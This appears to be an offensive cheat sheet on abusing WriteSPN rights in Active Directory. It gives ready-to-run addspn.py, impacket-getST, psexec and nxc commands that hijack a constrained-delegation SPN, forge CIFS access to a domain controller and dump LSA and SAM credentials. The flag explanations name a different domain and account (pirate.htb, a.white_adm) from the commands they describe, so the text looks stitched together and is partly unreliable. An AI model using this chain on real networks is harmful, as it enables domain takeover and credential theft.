# WriteSPN

## <mark style="color:$primary;">Deleting SPN</mark>

```bash
python3 /usr/share/krbrelayx/addspn.py -u 'militech.local\s.reed_adm' -p 'P@ssw0rd' -t 'WEB01$' -s 'HTTP/WEB01.militech.local' -r 13.13.13.13
```

## <mark style="color:$primary;">Adding SPN</mark>

```bash
python3 /usr/share/krbrelayx/addspn.py -u 'militech.local\s.reed_adm' -p 'P@ssw0rd' -T samname -t 'DC01$' -s 'HTTP/WEB01.militech.local' 13.13.13.13
```

## <mark style="color:$primary;">SPN Hijacking</mark>

If an attacker controls an account configured with Constrained Delegation to a specific SPN, and possesses <mark style="color:green;">WriteSPN</mark> privileges over a high-value target (like a Domain Controller), the delegation path can be hijacked.

By <mark style="color:yellow;">**removing the allowed SPN**</mark> from its original host and <mark style="color:yellow;">**registering it to the high-value target**</mark>, the KDC is <mark style="color:yellow;">**forced to encrypt**</mark> the delegated Service Ticket <mark style="color:yellow;">**using the high-value target's password hash**</mark>. Because the Service Name (`sname`) in the <mark style="color:yellow;">**ticket header is not cryptographically protected**</mark> by the KDC signature, <mark style="color:yellow;">**it can be arbitrarily altered**</mark> (e.g., changing `HTTP` to `CIFS`) before being presented to the target service.

## <mark style="color:$primary;">Service Name(sname) Substitution</mark>

So after we switched owner of the service now the only thing we need is to change service from HTTP to CIFS, which would get us full access to files system (which we can use to dump LSA, SAM etc.)

```bash
impacket-getST MILITECH.LOCAL/s.reed_adm:'P@ssw0rd' -spn HTTP/WEB01.militech.local -impersonate Administrator -dc-ip DC01.militech.local -altservice CIFS/DC01.militech.local
```

* `PIRATE.HTB/a.white_adm:'P@ssw0rd'`: The compromised account holding Constrained Delegation rights.
* `-spn HTTP/WEB01.pirate.htb`: The hijacked SPN that is now registered to the target DC.
* `-impersonate Administrator`: The privileged user being impersonated via S4U2Self and S4U2Proxy.
* `-altservice CIFS/DC01.pirate.htb`: Alters the unencrypted `sname` field in the ticket from `HTTP` to `CIFS.`

## <mark style="color:$primary;">DUMP</mark>

```bash
export KRB5CCNAME=Administrator@CIFS_DC01.militech.local@MILITECH.LOCAL.ccache
impacket-psexec DC01.militech.local -k -no-pass
```

Then we can use nxc `-lsa` and `-sam` features to dump new creds with using admins's key:

```bash
nxc smb WEB01.pirate.htb -u 'Administrator' -p '' -k --lsa --sam
```
